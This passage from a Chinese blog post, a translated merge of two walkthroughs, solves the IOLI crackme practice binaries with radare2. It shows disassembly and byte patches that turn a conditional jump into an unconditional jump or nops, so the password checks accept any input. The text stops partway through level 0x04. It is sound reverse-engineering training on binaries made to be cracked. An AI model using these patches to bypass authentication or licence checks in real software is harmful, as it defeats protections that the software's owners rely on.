          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-08T00:00:00+08:00" content="2014-08-08">
              2014-08-08
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2014/08/08/defeating-ioli-with-radare2/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2014/08/08/defeating-ioli-with-radare2/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>译者表示：把两篇文章揉合到了一起。</p>
<p>原文自：<a href="http://dustri.org/b/defeating-ioli-with-radare2.html" target="_blank" rel="external">Defeating ioli with radare2</a><br>和<a href="http://radare.nopcode.org/wiki/index.php?n=Examples.Crackme" target="_blank" rel="external">Crackme solution from pancake</a><br>需要：</p>
<ul>
<li><a href="http://www.radare.org/y/" target="_blank" rel="external">radare2</a></li>
<li><a href="http://www.jegerlehner.ch/intel/" target="_blank" rel="external">asm cheat sheet</a></li>
<li><a href="http://pof.eslack.org/tmp/IOLI-crackme.tar.gz" target="_blank" rel="external">IOLI crackme suite</a>(<a href="http://dustri.org/b/files/IOLI-crackme.tar.gz" target="_blank" rel="external">another mirror</a>)</li>
</ul>
<h2 id="crackme_0x00">crackme 0x00</h2><p>第一个crackme，非常简单。</p>
<pre><code> ✘ ⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x00
IOLI Crackme Level <span class="number">0x00</span>
Password: <span class="number">1234</span>
Invalid Password!

⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x00
 -- I script in C, because fuck you.
[<span class="number">0x08048360</span>]&gt; aa
[<span class="number">0x08048360</span>]&gt; pdf@sym.main
|          ; DATA XREF from <span class="number">0x08048377</span> (fcn<span class="number">.08048356</span>)
/ (fcn) sym.main <span class="number">127</span>
|          <span class="number">0x08048414</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048415</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048417</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|          <span class="number">0x0804841a</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x0804841d</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048422</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048425</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048428</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x0804842b</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804842e</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048430</span>    c7042468850. mov dword [esp], str.IOLI_Crackme_Level_0x00_n ; str.IOLI_Crackme_Level_0x00_n
|          <span class="number">0x08048437</span>    e804ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|             fcn<span class="number">.08048336</span>(unk) ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x0804843c</span>    c7042481850. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048443</span>    e8f8feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|             fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x08048448</span>    <span class="number">8</span>d45e8       lea eax, [ebp-<span class="number">0x18</span>]
|          <span class="number">0x0804844b</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804844f</span>    c704248c850. mov dword [esp], <span class="number">0x804858c</span> ;  <span class="number">0x0804858c</span> 
|          <span class="number">0x08048456</span>    e8d5feffff   call sym.imp.<span class="built_in">scanf</span> ; (fcn<span class="number">.08048326</span>)
|             fcn<span class="number">.08048326</span>() ; sym.imp.<span class="built_in">scanf</span>
|          <span class="number">0x0804845b</span>    <span class="number">8</span>d45e8       lea eax, [ebp-<span class="number">0x18</span>]
|          <span class="number">0x0804845e</span>    c74424048f8. mov dword [esp+<span class="number">0x4</span>], str<span class="number">.250382</span> ; str<span class="number">.250382</span>
|          <span class="number">0x08048466</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048469</span>    e8e2feffff   call sym.imp.<span class="built_in">strcmp</span> ; (fcn<span class="number">.08048346</span>)
|             fcn<span class="number">.08048346</span>() ; sym.imp.<span class="built_in">strcmp</span>
|          <span class="number">0x0804846e</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x08048470</span>    <span class="number">740</span>e         je <span class="number">0x8048480</span>
|      |   <span class="number">0x08048472</span>    c7042496850. mov dword [esp], str.Invalid_Password__n ; str.Invalid_Password__n
|      |   <span class="number">0x08048479</span>    e8c2feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|      |      fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|     ,==&lt; <span class="number">0x0804847e</span>    eb0c         jmp <span class="number">0x804848c</span> ; (sym.main)
|     ||   ; JMP XREF from <span class="number">0x08048470</span> (unk)
|     |`-&gt; <span class="number">0x08048480</span>    c70424a9850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|     |    <span class="number">0x08048487</span>    e8b4feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|     |       fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|     `--&gt; <span class="number">0x0804848c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048491</span>    c9           leave
\          <span class="number">0x08048492</span>    c3           ret
[<span class="number">0x08048360</span>]&gt; s <span class="number">0x0804847e</span>
[<span class="number">0x0804847e</span>]&gt; wx eb
[<span class="number">0x0804847e</span>]&gt; px <span class="number">20</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0804847e</span>  eb0c c704 <span class="number">24</span>a9 <span class="number">8504</span> <span class="number">08e8</span> b4fe ffff b800  ....$...........
<span class="number">0x0804848e</span>  <span class="number">0000</span> <span class="number">00</span>c9                                ....            
[<span class="number">0x0804847e</span>]&gt; pD <span class="number">20</span>
|      ,=&lt; <span class="number">0x0804847e</span>    eb0c         jmp <span class="number">0x804848c</span> ; (sym.main)
|      |   ; JMP XREF from <span class="number">0x08048470</span> (unk)
|      |   <span class="number">0x08048480</span>    c70424a9850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|      |   <span class="number">0x08048487</span>    e8b4feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|      |      fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|      `-&gt; <span class="number">0x0804848c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048491</span>    c9           leave
[<span class="number">0x08048470</span>]&gt; q
</code></pre><p>输入任何密码。</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x00
IOLI Crackme Level <span class="number">0x00</span>
<span class="string">Password:</span> <span class="number">12345</span>
Password <span class="string">OK :</span>)
</code></pre><h2 id="crackme0x01">crackme0x01</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x01
IOLI Crackme Level <span class="number">0</span>x01
Password: <span class="number">12345</span>
Invalid Password!
</code></pre><p>反汇编我们看到有个跳转到<code>OK</code>的<code>je</code>，改成<code>jmp</code></p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x01
 -- Deltify your life with radare2
[<span class="number">0x08048330</span>]&gt; aa
[<span class="number">0x08048330</span>]&gt; pdf@sym.main 
|          ; DATA XREF from <span class="number">0x08048347</span> (fcn<span class="number">.08048322</span>)
/ (fcn) sym.main <span class="number">113</span>
|          <span class="number">0x080483e4</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x080483e5</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x080483e7</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x080483ea</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x080483ed</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080483f2</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f5</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f8</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x080483fb</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x080483fe</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048400</span>    c7042428850. mov dword [esp], str.IOLI_Crackme_Level_0x01_n ; str.IOLI_Crackme_Level_0x01_n
|          <span class="number">0x08048407</span>    e810ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>(unk) ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x0804840c</span>    c7042441850. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048413</span>    e804ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x08048418</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804841b</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804841f</span>    c704244c850. mov dword [esp], <span class="number">0x804854c</span> ;  <span class="number">0x0804854c</span> 
|          <span class="number">0x08048426</span>    e8e1feffff   call sym.imp.<span class="built_in">scanf</span> ; (fcn<span class="number">.08048302</span>)
|             fcn<span class="number">.08048302</span>() ; sym.imp.<span class="built_in">scanf</span>
|          <span class="number">0x0804842b</span>    <span class="number">817</span>dfc9a140. cmp dword [ebp-<span class="number">0x4</span>], <span class="number">0x149a</span>
|      ,=&lt; <span class="number">0x08048432</span>    <span class="number">740</span>e         je <span class="number">0x8048442</span>
|      |   <span class="number">0x08048434</span>    c704244f850. mov dword [esp], str.Invalid_Password__n ; str.Invalid_Password__n
|      |   <span class="number">0x0804843b</span>    e8dcfeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|      |      fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     ,==&lt; <span class="number">0x08048440</span>    eb0c         jmp <span class="number">0x804844e</span> ; (sym.main)
|     ||   ; JMP XREF from <span class="number">0x08048432</span> (unk)
|     |`-&gt; <span class="number">0x08048442</span>    c7042462850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|     |    <span class="number">0x08048449</span>    e8cefeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|     |       fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     `--&gt; <span class="number">0x0804844e</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048453</span>    c9           leave
\          <span class="number">0x08048454</span>    c3           ret
[<span class="number">0x08048330</span>]&gt; s <span class="number">0x08048432</span>
[<span class="number">0x08048432</span>]&gt; wx eb
[<span class="number">0x08048432</span>]&gt; q
</code></pre><p>接着输入任何密码：</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x01
IOLI Crackme Level <span class="number">0x01</span>
<span class="string">Password:</span> <span class="number">12345</span>
Password <span class="string">OK :</span>)
</code></pre><h2 id="crackme0x02">crackme0x02</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x02
IOLI Crackme Level <span class="number">0</span>x02
Password: <span class="number">12345</span>
Invalid Password!
</code></pre><p>这回还是个比较，将后面的<code>je</code>判断改成<code>nop</code>。有兴趣还可以笔算下怎么生成的密码。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x02
 -- Invert the block bytes <span class="keyword">using</span> the <span class="string">'I'</span> key in visual mode
[<span class="number">0x08048330</span>]&gt; aa
[<span class="number">0x08048330</span>]&gt; pdf@sym.main
|          ; DATA XREF from <span class="number">0x08048347</span> (fcn<span class="number">.08048322</span>)
/ (fcn) sym.main <span class="number">144</span>
|          <span class="number">0x080483e4</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x080483e5</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x080483e7</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x080483ea</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x080483ed</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080483f2</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f5</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f8</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x080483fb</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x080483fe</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048400</span>    c7042448850. mov dword [esp], str.IOLI_Crackme_Level_0x02_n ; str.IOLI_Crackme_Level_0x02_n
|          <span class="number">0x08048407</span>    e810ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>(unk) ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x0804840c</span>    c7042461850. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048413</span>    e804ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x08048418</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804841b</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804841f</span>    c704246c850. mov dword [esp], <span class="number">0x804856c</span> ;  <span class="number">0x0804856c</span> 
|          <span class="number">0x08048426</span>    e8e1feffff   call sym.imp.<span class="built_in">scanf</span> ; (fcn<span class="number">.08048302</span>)
|             fcn<span class="number">.08048302</span>() ; sym.imp.<span class="built_in">scanf</span>
|          <span class="number">0x0804842b</span>    c745f85a000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x5a</span> ;  <span class="number">0x0000005a</span> 
|          <span class="number">0x08048432</span>    c745f4ec010. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x1ec</span> ;  <span class="number">0x000001ec</span> 
|          <span class="number">0x08048439</span>    <span class="number">8</span>b55f4       mov edx, [ebp-<span class="number">0xc</span>]
|          <span class="number">0x0804843c</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x0804843f</span>    <span class="number">0110</span>         add [eax], edx
|          <span class="number">0x08048441</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x08048444</span>    <span class="number">0f</span>af45f8     imul eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x08048448</span>    <span class="number">8945f</span>4       mov [ebp-<span class="number">0xc</span>], eax
|          <span class="number">0x0804844b</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804844e</span>    <span class="number">3</span>b45f4       cmp eax, [ebp-<span class="number">0xc</span>]
|      ,=&lt; <span class="number">0x08048451</span>    <span class="number">750</span>e         jne <span class="number">0x8048461</span>
|      |   <span class="number">0x08048453</span>    c704246f850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|      |   <span class="number">0x0804845a</span>    e8bdfeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|      |      fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     ,==&lt; <span class="number">0x0804845f</span>    eb0c         jmp <span class="number">0x804846d</span> ; (sym.main)
|     ||   ; JMP XREF from <span class="number">0x08048451</span> (unk)
|     |`-&gt; <span class="number">0x08048461</span>    c704247f850. mov dword [esp], str.Invalid_Password__n ; str.Invalid_Password__n
|     |    <span class="number">0x08048468</span>    e8affeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|     |       fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     `--&gt; <span class="number">0x0804846d</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048472</span>    c9           leave
\          <span class="number">0x08048473</span>    c3           ret
[<span class="number">0x08048330</span>]&gt; s <span class="number">0x08048451</span>
[<span class="number">0x08048451</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048451</span>]&gt; px <span class="number">10</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x08048451</span>  <span class="number">9090</span> c704 <span class="number">246f</span> <span class="number">8504</span> <span class="number">08e8</span>                 ....$o....      
[<span class="number">0x08048451</span>]&gt; q
</code></pre><p>输入任何密码：</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x02
IOLI Crackme Level <span class="number">0x02</span>
<span class="string">Password:</span> <span class="number">12345</span>
Password <span class="string">OK :</span>)
</code></pre><h2 id="crackme0x03">crackme0x03</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x03
IOLI Crackme Level <span class="number">0</span>x03
Password: <span class="number">12345</span>
Invalid Password!
</code></pre><p>这回发现难一些了，没有明文字符串。main函数调用一个<code>test</code>，<code>test</code>又调用<code>shift</code>。虽然不知道这些函数是干嘛的。但发现<code>sym.test</code>中有两个似乎加密过的字符串，可能对应<code>invalid</code>和<code>Ok</code>两个字符串。</p>
<p>猜测<code>sym.shift</code>是一种移位加密方法。</p>
<p>基本上可以猜出来<code>0x0804848a</code>是<code>OK</code>的地方</p>
<pre><code> ✘ ⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x03
 -- Use zoom.byte=entropy and press <span class="string">'z'</span> in visual mode to zoom out to see the entropy of the whole file
[<span class="number">0x08048360</span>]&gt; aa
[<span class="number">0x08048360</span>]&gt; pdf@sym.main
|          ; UNKNOWN XREF from <span class="number">0x0804847a</span> (unk)
|          ; DATA XREF from <span class="number">0x08048377</span> (fcn<span class="number">.08048356</span>)
/ (fcn) sym.main <span class="number">128</span>
|          <span class="number">0x08048498</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048499</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804849b</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x0804849e</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x080484a1</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080484a6</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080484a9</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080484ac</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x080484af</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x080484b2</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x080484b4</span>    c7042410860. mov dword [esp], str.IOLI_Crackme_Level_0x03_n ; str.IOLI_Crackme_Level_0x03_n
|          <span class="number">0x080484bb</span>    e890feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x080484c0</span>    c7042429860. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x080484c7</span>    e884feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x080484cc</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x080484cf</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080484d3</span>    c7042434860. mov dword [esp], <span class="number">0x8048634</span> ;  <span class="number">0x08048634</span> 
|          <span class="number">0x080484da</span>    e851feffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x080484df</span>    c745f85a000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x5a</span> ;  <span class="number">0x0000005a</span> 
|          <span class="number">0x080484e6</span>    c745f4ec010. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x1ec</span> ;  <span class="number">0x000001ec</span> 
|          <span class="number">0x080484ed</span>    <span class="number">8</span>b55f4       mov edx, [ebp-<span class="number">0xc</span>]
|          <span class="number">0x080484f0</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080484f3</span>    <span class="number">0110</span>         add [eax], edx
|          <span class="number">0x080484f5</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080484f8</span>    <span class="number">0f</span>af45f8     imul eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080484fc</span>    <span class="number">8945f</span>4       mov [ebp-<span class="number">0xc</span>], eax
|          <span class="number">0x080484ff</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|          <span class="number">0x08048502</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048506</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048509</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804850c</span>    e85dffffff   call sym.test
|             sym.test()
|          <span class="number">0x08048511</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048516</span>    c9           leave
\          <span class="number">0x08048517</span>    c3           ret
[<span class="number">0x08048360</span>]&gt; pdf@sym.test
|          ; UNKNOWN XREF from <span class="number">0x0804846e</span> (unk)
|          ; CALL XREF from <span class="number">0x0804850c</span> (unk)
/ (fcn) sym.test <span class="number">42</span>
|          <span class="number">0x0804846e</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804846f</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048471</span>    <span class="number">83</span>ec08       sub esp, <span class="number">0x8</span>
|          <span class="number">0x08048474</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x08048477</span>    <span class="number">3</span>b450c       cmp eax, [ebp+<span class="number">0xc</span>]
|      ,=&lt; <span class="number">0x0804847a</span>    <span class="number">740</span>e         je loc<span class="number">.0804848</span>a
|      |   <span class="number">0x0804847c</span>    c70424ec850. mov dword [esp], str.Lqydolg_Sdvvzrug_ ; str.Lqydolg_Sdvvzrug_
|      |   <span class="number">0x08048483</span>    e88cffffff   call sym.shift
|      |      sym.shift(unk)
|     ,==&lt; <span class="number">0x08048488</span>    eb0c         jmp loc<span class="number">.08048496</span>
|     ||   ; JMP XREF from <span class="number">0x0804847a</span> (unk)
|- loc<span class="number">.0804848</span>a <span class="number">14</span>
|     |`-&gt; <span class="number">0x0804848a</span>    c70424fe850. mov dword [esp], str.Sdvvzrug_RN______ ; str.Sdvvzrug_RN______
|     |    <span class="number">0x08048491</span>    e87effffff   call sym.shift
|     |       sym.shift()
|     |    ; JMP XREF from <span class="number">0x08048488</span> (unk)
|- loc<span class="number">.08048496</span> <span class="number">2</span>
|     `--&gt; <span class="number">0x08048496</span>    c9           leave
\          <span class="number">0x08048497</span>    c3           ret
[<span class="number">0x08048360</span>]&gt; s <span class="number">0x0804847a</span>
[<span class="number">0x0804847a</span>]&gt; px <span class="number">20</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0804847a</span>  <span class="number">7400</span> <span class="number">0000</span> <span class="number">24</span>ec <span class="number">8504</span> <span class="number">08e8</span> <span class="number">8</span>cff ffff eb0c  t...$...........
<span class="number">0x0804848a</span>  c704 <span class="number">24f</span>e                                ..$.            
[<span class="number">0x0804847a</span>]&gt; wx eb
[<span class="number">0x0804847a</span>]&gt; px <span class="number">20</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0804847a</span>  eb0e c704 <span class="number">24</span>ec <span class="number">8504</span> <span class="number">08e8</span> <span class="number">8</span>cff ffff eb0c  ....$...........
<span class="number">0x0804848a</span>  c704 <span class="number">24f</span>e                                ..$.            
[<span class="number">0x0804847a</span>]&gt; pdf@sym.test
|          ; UNKNOWN XREF from <span class="number">0x0804846e</span> (unk)
|          ; CALL XREF from <span class="number">0x0804850c</span> (unk)
/ (fcn) sym.test <span class="number">42</span>
|          <span class="number">0x0804846e</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804846f</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048471</span>    <span class="number">83</span>ec08       sub esp, <span class="number">0x8</span>
|          <span class="number">0x08048474</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x08048477</span>    <span class="number">3</span>b450c       cmp eax, [ebp+<span class="number">0xc</span>]
|      ,=&lt; <span class="number">0x0804847a</span>    eb0e         jmp loc<span class="number">.0804848</span>a
|      |   <span class="number">0x0804847c</span>    c70424ec850. mov dword [esp], str.Lqydolg_Sdvvzrug_ ; str.Lqydolg_Sdvvzrug_
|      |   <span class="number">0x08048483</span>    e88cffffff   call sym.shift
|      |      sym.shift(unk)
|     ,==&lt; <span class="number">0x08048488</span>    eb0c         jmp loc<span class="number">.08048496</span>
|     ||   ; JMP XREF from <span class="number">0x0804847a</span> (unk)
|- loc<span class="number">.0804848</span>a <span class="number">14</span>
|     |`-&gt; <span class="number">0x0804848a</span>    c70424fe850. mov dword [esp], str.Sdvvzrug_RN______ ; str.Sdvvzrug_RN______
|     |    <span class="number">0x08048491</span>    e87effffff   call sym.shift
|     |       sym.shift()
|     |    ; JMP XREF from <span class="number">0x08048488</span> (unk)
|- loc<span class="number">.08048496</span> <span class="number">2</span>
|     `--&gt; <span class="number">0x08048496</span>    c9           leave
\          <span class="number">0x08048497</span>    c3           ret
[<span class="number">0x0804847a</span>]&gt; q
</code></pre><p>输入任意密码</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x03                
IOLI Crackme Level <span class="number">0</span>x03
Password: <span class="number">12345</span>
Password OK!!! :)
</code></pre><h2 id="crackme0x04">crackme0x04</h2><p>尝试12345竟然成功了……这不重要，README中给出了所有crackme的密码方便破解。</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x04
IOLI Crackme Level <span class="number">0</span>x04
Password: aaaaa
Password Incorrect!
</code></pre><p>又一个叫<code>sym.check</code>的函数，里头赫然写着明文的<code>invalid</code>和<code>ok</code>。仍然是将判断跳转改成什么都不做。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ <span class="literal">r2</span> -w ./crackme0x04
 -- Interpret your own radare2 scripts with <span class="string">'. &lt;path-to-your-script&gt;'</span>. Similar to the bash source alias command.
[<span class="number">0x080483d0</span>]&gt; aa
[<span class="number">0x080483d0</span>]&gt; pdf@sym.main
|          <span class="comment">; UNKNOWN XREF from 0x08048509 (unk)</span>
|          <span class="comment">; DATA XREF from 0x080483e7 (fcn.080483ba)</span>
/ (fcn) sym.main <span class="number">92</span>
